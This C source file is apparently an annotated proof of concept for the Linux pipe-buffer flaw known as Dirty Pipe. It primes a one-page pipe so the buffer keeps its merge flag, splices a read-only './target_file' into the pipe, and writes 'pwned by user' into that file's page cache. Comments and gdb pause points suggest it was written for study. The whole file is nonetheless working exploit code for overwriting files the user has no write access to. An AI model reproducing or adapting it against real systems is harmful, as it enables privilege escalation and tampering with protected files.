#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#define __USE_GNU
#include <fcntl.h>
#include <stdio.h>
#define PAGESIZE 4096
#define F_SETPIPE_SZ       1031

void puts_getchar(char *msg)
{ // stop at different stages to explore state with gdb
  puts(msg);
  getchar();
}

void setup_pipe(int pipefd_r, int pipefd_w)
{
  // Set the size of the pipe's ring buffer to one page for simplicity.
  if(fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) { exit(7); }
  /*
   * Fill pipe completely using writes. This makes sure that all 
   * 'pipe_buffer's have the MERGE_FLAG set. (not rly needed for our 
   *  small pipe)
   */
  for( int i = 1; i <= PAGESIZE/8; i++)
  {
    if ( i == 1 ) 
    { // attach gdb to view initialization of the 'pipe_buffer'
      puts_getchar("About to perform first write() to pipe");  
    }
    if ( i == PAGESIZE/8 )
    { // attach gdb to view 'legit' appending to a CAN_MERGE 'pipe_buffer'
      puts_getchar("About to perform last write() to pipe"); 
    }
    if(write(pipefd_w, "AAAAAAAA", 8)!=8) { exit(1); }
  }
  /* 
   * Drain the pipe completely so splicing will definitely get a buffer 
   * with set MERGE_FLAG and next write goes down the 'append' branch 
   * i.e., writes into page cache.
   */
  char buf[8];
  for( int i = 1; i <= PAGESIZE/8; i++)
  {
    if ( i == PAGESIZE/8 )
    { // attach gdb to view teardown of an emptied anon. 'pipe_buffer'
      puts_getchar("About to perform last read() from pipe"); 
    }
    if(read(pipefd_r, buf, 8)!=8) { exit(1); }
  }
}

void main()
{
  // USER:   open the target file,
  // KERNEL: loads it from disk into main memory & creates a page cache
  //   entry for it
  int tfd = open("./target_file", O_RDONLY);
  if(tfd<0) { exit(1); }
  /* 
   * Use this as an ez way to see what's going on in the page cache.
   * USER:   create shared mapping of file at VA
   * KERNEL: just add page table entry mapping VA to PA in page cache
   */
  void *file_mapping = (void *)0x1337000;
  if(mmap(file_mapping, PAGESIZE, PROT_READ, MAP_SHARED, tfd, 0)
      !=file_mapping)
    exit(2);
  // USER: create and prepare the pipe
  int pipefds[2];
  // gdb: view fresh 'pipe_inode_info'
  puts_getchar("About to create pipe()"); 
  if(pipe(pipefds)) { exit(1); }
  setup_pipe(pipefds[0], pipefds[1]);
  // USER:   splice the file to the pipe
  // KERNEL: just puts reference to page cache into 'pipe_bufffer'
  puts_getchar("About to splice() file to pipe");
  if(splice(tfd, 0, pipefds[1], 0, 5, 0)<0) { exit(1); }
  /*
   * USER:   write to pipe
   * KERNEL: writes it to file's representation in the page cache, 
   *   appending to the offset where the splice stopped
   *
   * Let's see what's in the page cache before writing...
   */
  printf("Page cache before writing: %s", file_mapping);
  puts_getchar("About to write() into page cache");
  if(write(pipefds[1], "pwned by user", 13)!=13) { exit(1); }
  /*
   * ... and after writing.
   */
  printf("Page cache after writing: %s", file_mapping);
  // TOOD: Maybe flush page chache and do it again?
  exit(0);
}	  
